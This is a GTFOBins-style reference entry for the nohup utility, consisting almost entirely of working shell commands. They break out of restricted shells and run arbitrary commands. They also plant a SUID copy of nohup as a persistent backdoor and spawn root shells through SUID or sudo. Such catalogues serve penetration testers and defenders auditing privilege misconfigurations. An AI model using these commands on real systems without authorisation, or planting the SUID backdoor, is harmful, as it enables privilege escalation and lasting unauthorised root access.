# GTFOBin: nohup

## Shell

It can be used to break out from restricted environments by spawning an interactive system shell.

```
nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
```

## Command

It can be used to break out from restricted environments by running non-interactive system commands.

```
COMMAND='/usr/bin/id'
nohup "$COMMAND"
cat nohup.out
```

## SUID

If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run `sh -p`, omit the `-p` argument on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

```
sudo install -m =xs $(which nohup) .

./nohup /bin/sh -p -c "sh -p <$(tty) >$(tty) 2>$(tty)"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

```
sudo nohup /bin/sh -c "sh <$(tty) >$(tty) 2>$(tty)"
```